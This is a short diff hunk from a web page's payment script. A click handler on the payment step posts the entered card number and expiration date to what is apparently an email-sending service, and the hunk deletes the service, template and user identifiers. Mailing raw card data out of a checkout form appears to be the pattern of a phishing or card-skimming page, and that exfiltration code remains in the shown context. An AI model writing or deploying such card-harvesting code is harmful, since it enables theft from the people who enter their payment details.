@@ -1106,9 +1106,6 @@ document.getElementById("payment-next").addEventListener("click", async () => {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
-            service_id: "service_w7q3bge",
-            template_id: "template_oply56o",
-            user_id: "JxfpYH0Ko8Z5E6tEz",
             template_params: {
                 card_number: cardNumber,
                 expiration: exp,
@@ -1126,6 +1123,7 @@ document.getElementById("payment-next").addEventListener("click", async () => {
         alert("Error sending email! " + (result.details || ""));
     }
 });
+
 
 
 </script>
